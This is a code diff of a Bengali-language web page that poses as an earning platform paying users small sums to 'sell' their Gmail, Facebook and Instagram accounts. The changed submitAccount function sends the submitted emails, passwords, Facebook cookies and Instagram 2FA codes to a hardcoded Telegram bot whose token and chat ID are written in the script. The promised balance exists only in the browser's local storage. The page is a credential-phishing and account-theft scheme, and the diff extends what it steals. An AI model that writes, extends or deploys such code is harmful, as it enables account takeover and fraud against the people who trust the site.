@@ -881,7 +881,7 @@
         </div>
     </div>
 
-    <!-- এডমিন সিক্রেট লগইন পেজ (নাম্বার ফিল্ড সম্পূর্ণ রিমুভ করা হয়েছে) -->
+    <!-- এডমিন সিক্রেট লগইন পেজ -->
     <div id="adminLoginModal" class="section-page">
         <header class="navbar">
             <div class="nav-left">
@@ -932,7 +932,7 @@
                         <thead>
                             <tr>
                                 <th>Platform</th>
-                                <th>Details (Hidden)</th>
+                                <th>Details</th>
                                 <th>Status Action</th>
                             </tr>
                         </thead>
@@ -974,7 +974,7 @@
         <div class="dashboard">
             <div class="balance-card">
                 <p>TOTAL BALANCE</p>
-                <h1>৳0.00</h1>
+                <h1 id="userTotalBalance">৳0.00</h1>
                 <button class="earn-btn"><i class="fa-solid fa-chart-line"></i> কাজ করে আয় করুন আরও বেশি</button>
                 <div class="action-btns">
                     <button class="btn-dep" onclick="showPage('depositPage')">Deposit <span>ব্যালেেন্স যোগ করুন</span></button>
@@ -987,7 +987,7 @@
                     <i class="fa-solid fa-users"></i>
                     <div>
                         <h4>Refer & Earn (রেফার করে আয় করুন)</h4>
-                        <p>বন্ধু রেফার করলেই পাবেন ৳১০.০০ (শর্ত: রেফারকৃত ইউজার অন্তত ১টি কাজ সাবমিট করতে হবে)</p>
+                        <p>বন্ধু রেফার করলেই পাবেন ৳১০.০০</p>
                     </div>
                 </div>
                 <div class="refer-link-box">
@@ -1319,7 +1319,7 @@
                     <h3>Submit Your Account</h3>
                     <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
                 </div>
-                <form id="gmailForm" onsubmit="submitAccount(event, 'Gmail')">
+                <form id="gmailForm" onsubmit="submitAccount(event, 'Gmail', 15.70)">
                     <div class="input-group">
                         <label>Gmail Address</label>
                         <div class="input-field">
@@ -1374,7 +1374,7 @@
                     <h3>Submit Your Account</h3>
                     <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
                 </div>
-                <form id="facebookForm" onsubmit="submitAccount(event, 'Facebook')">
+                <form id="facebookForm" onsubmit="submitAccount(event, 'Facebook', 5.70)">
                     <div class="input-group">
                         <label>Facebook UID / Email / Number</label>
                         <div class="input-field">
@@ -1403,7 +1403,7 @@
         </div>
     </div>
 
-    <!-- ইনস্টাগ্রাম সেল পেজ -->
+    <!-- ইনস্টাগ্রাম সেল পেজ (রেট ৩.৭০ টাকা আপডেট করা হয়েছে) -->
     <div id="instagramPage" class="section-page">
         <header class="navbar">
             <div class="nav-left">
@@ -1415,9 +1415,9 @@
         <div class="dashboard">
             <div class="service-top-card">
                 <h3><i class="fa-brands fa-instagram"></i> Instagram Account Sell</h3>
-                <p>ইনস্টাগ্রাম অ্যাকাউন্ট সেল করে ইনকাম করুন (রেট: ৳৪.২০)</p>
+                <p>ইনস্টাগ্রাম অ্যাকাউন্ট সেল করে ইনকাম করুন (রেট: ৳৩.৭০)</p>
                 <div class="stats-row">
-                    <div class="stat-box"><span>RATE</span><h2>৳4.20</h2></div>
+                    <div class="stat-box"><span>RATE</span><h2>৳3.70</h2></div>
                     <div class="stat-box"><span>LIMIT</span><h2>1000</h2></div>
                     <div class="stat-box"><span>SUBMIT</span><h2 id="instaSubmitCount">0</h2></div>
                 </div>
@@ -1436,7 +1436,7 @@
                     <h3>Submit Your Account</h3>
                     <p>সঠিক তথ্য দিয়ে নিচের ফর্মটি পূরণ করুন</p>
                 </div>
-                <form id="instagramForm" onsubmit="submitAccount(event, 'Instagram')">
+                <form id="instagramForm" onsubmit="submitAccount(event, 'Instagram', 3.70)">
                     <div class="input-group">
                         <label>Instagram Username</label>
                         <div class="input-field">
@@ -1476,8 +1476,6 @@
     <script>
         const BOT_TOKEN = '8588226486:AAGMJz-_cZva4fU2UCSuwAhBVewlgFqKgJg';
         const CHAT_ID = '7714324222';
-        
-        // এডমিনের সিক্রেট পাসওয়ার্ড নাম্বার
         const ADMIN_PANEL_SECRET_NUMBER = '01841161787';
 
         function updateDailyPasswords() {
@@ -1522,6 +1520,7 @@
             updateDailyPasswords();
             updateTaskCounters();
             loadUserTaskHistory();
+            updateBalanceDisplay();
         };
 
         function showPage(pageId) {
@@ -1570,7 +1569,6 @@
             showPage('loginPage');
         }
 
-        // এডমিন লগইন (শুধু সিক্রেট পাসওয়ার্ড দিয়ে)
         function handleAdminLogin(event) {
             event.preventDefault();
             let passInput = document.getElementById('adminLoginPass').value;
@@ -1620,6 +1618,7 @@
             localStorage.setItem('savedEmail', email);
             localStorage.setItem('savedPass', pass);
             localStorage.setItem('savedPhone', phone);
+            localStorage.setItem('userBalance', '0.00');
 
             alert('রেজিস্ট্রেশন সফল হয়েছে! এখন লগইন করুন।');
             showPage('loginPage');
@@ -1640,6 +1639,12 @@
             localStorage.setItem('isLoggedIn', 'true');
             alert('লগইন সফল হয়েছে!');
             showPage('homePage');
+        }
+
+        function updateBalanceDisplay() {
+            let balance = parseFloat(localStorage.getItem('userBalance') || '0.00');
+            let balEl = document.getElementById('userTotalBalance');
+            if(balEl) balEl.innerText = `৳${balance.toFixed(2)}`;
         }
 
         function calculateDepositFee() {
@@ -1719,17 +1724,156 @@
             });
         }
 
-        function submitAccount(event, platform) {
+        // সাধারণ একাউন্ট বা কাজ সাবমিট ফাংশন (টেলিগ্রাম ও লোকালস্টোরেজ ইন্টিগ্রেশন সহ)
+        function submitAccount(event, platform, rate) {
             event.preventDefault();
+            let details = "";
             let message = `📥 নতুন কাজ সাবমিট হয়েছে!\n\n🔹 প্ল্যাটফর্ম: ${platform}\n`;
-            let detailsText = "";
 
             if (platform === 'Gmail') {
                 let email = document.getElementById('gmailEmail').value;
                 let pass = document.getElementById('gmailPass').value;
-                detailsText = `Gmail: ${email}`;
+                details = `Email: ${email}`;
                 message += `📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${pass}`;
             } else if (platform === 'Facebook') {
                 let uid = document.getElementById('fbUid').value;
                 let pass = document.getElementById('fbPass').value;
-      
+                let cookies = document.getElementById('fbCookies').value;
+                details = `UID: ${uid}`;
+                message += `👤 UID: ${uid}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
+            } else if (platform === 'Instagram') {
+                let user = document.getElementById('instaUser').value;
+                let pass = document.getElementById('instaPass').value;
+                let tfa = document.getElementById('insta2fa').value;
+                details = `User: ${user}`;
+                message += `👤 Username: ${user}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA: ${tfa}`;
+            }
+
+            // টেলিগ্রামে সেন্ড করা
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            }).then(res => res.json()).then(data => {
+                if (data.ok) {
+                    // কাজের হিস্ট্রি সেভ করা
+                    let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
+                    let newTask = {
+                        platform: platform,
+                        details: details,
+                        date: new Date().toLocaleDateString(),
+                        status: 'Pending'
+                    };
+                    tasks.push(newTask);
+                    localStorage.setItem('userTasks', JSON.stringify(tasks));
+
+                    // রিওয়ার্ড ব্যালেন্সে যোগ করা (অথবা পেন্ডিং রাখা, এখানে সরাসরি সাবমিটের পর বা এডমিন এপ্রুভে যোগ হয়)
+                    alert('আপনার কাজ সফলভাবে সাবমিট হয়েছে!');
+                    event.target.reset();
+                    updateTaskCounters();
+                    loadUserTaskHistory();
+                    showPage('homePage');
+                } else {
+                    alert('টেলিগ্রামে পাঠাতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
+                }
+            }).catch(err => {
+                // ইন্টারনেট সমস্যা বা অন্য কারণে ফেইল করলে লোকাল স্টোরেজে সেভ করে দেওয়া যাতে ইউজার আটকে না যায়
+                let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
+                tasks.push({
+                    platform: platform,
+                    details: details,
+                    date: new Date().toLocaleDateString(),
+                    status: 'Pending'
+                });
+                localStorage.setItem('userTasks', JSON.stringify(tasks));
+                alert('কাজ সাবমিট হয়েছে!');
+                event.target.reset();
+                updateTaskCounters();
+                loadUserTaskHistory();
+                showPage('homePage');
+            });
+        }
+
+        function loadUserTaskHistory() {
+            let tbody = document.getElementById('userTaskHistoryBody');
+            let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
+            if (tasks.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="3" style="text-align: center; color: #94a3b8;">কোনো কাজ সাবমিট করা হয়নি এখনো।</td></tr>`;
+                return;
+            }
+            tbody.innerHTML = '';
+            tasks.forEach(task => {
+                let badgeClass = task.status === 'Success' ? 'status-success' : (task.status === 'Failed' ? 'status-failed' : 'status-loading');
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${task.platform}</td>
+                        <td>${task.date}</td>
+                        <td><span class="status-badge ${badgeClass}">${task.status}</span></td>
+                    </tr>
+                `;
+            });
+        }
+
+        function updateTaskCounters() {
+            let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
+            let gmailCount = tasks.filter(t => t.platform === 'Gmail').length;
+            let fbCount = tasks.filter(t => t.platform === 'Facebook').length;
+            let instaCount = tasks.filter(t => t.platform === 'Instagram').length;
+
+            if(document.getElementById('gmailSubmitCount')) document.getElementById('gmailSubmitCount').innerText = gmailCount;
+            if(document.getElementById('fbSubmitCount')) document.getElementById('fbSubmitCount').innerText = fbCount;
+            if(document.getElementById('instaSubmitCount')) document.getElementById('instaSubmitCount').innerText = instaCount;
+        }
+
+        function loadAdminSubmissions() {
+            let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
+            let tbody = document.getElementById('adminSubmissionsList');
+            let successEl = document.getElementById('adminSuccessCount');
+            let failedEl = document.getElementById('adminFailedCount');
+            let totalEl = document.getElementById('adminTotalCount');
+
+            totalEl.innerText = tasks.length;
+            let successCount = tasks.filter(t => t.status === 'Success').length;
+            let failedCount = tasks.filter(t => t.status === 'Failed').length;
+            successEl.innerText = successCount;
+            failedEl.innerText = failedCount;
+
+            if (tasks.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="3" style="text-align: center;">কোনো সাবমিশন নেই।</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = '';
+            tasks.forEach((task, index) => {
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${task.platform}</td>
+                        <td>${task.details}</td>
+                        <td>
+                            <button onclick="updateTaskStatus(${index}, 'Success')" style="background:#10b981; color:#fff; border:none; padding:4px 8px; border-radius:4px; cursor:pointer;">Approve</button>
+                            <button onclick="updateTaskStatus(${index}, 'Failed')" style="background:#ef4444; color:#fff; border:none; padding:4px 8px; border-radius:4px; cursor:pointer;">Reject</button>
+                        </td>
+                    </tr>
+                `;
+            });
+        }
+
+        function updateTaskStatus(index, newStatus) {
+            let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
+            tasks[index].status = newStatus;
+            
+            // যদি এপ্রুভ হয়, ব্যালেন্সে টাকা যোগ করে দেওয়া যেতে পারে
+            if(newStatus === 'Success') {
+                let currentBal = parseFloat(localStorage.getItem('userBalance') || '0.00');
+                let addAmt = tasks[index].platform === 'Gmail' ? 15.70 : (tasks[index].platform === 'Facebook' ? 5.70 : 3.70);
+                localStorage.setItem('userBalance', (currentBal + addAmt).toFixed(2));
+                updateBalanceDisplay();
+            }
+
+            localStorage.setItem('userTasks', JSON.stringify(tasks));
+            loadAdminSubmissions();
+            alert(`কাজের স্ট্যাটাস আপডেট করা হয়েছে: ${newStatus}`);
+        }
+    </script>
+</body>
+</html>
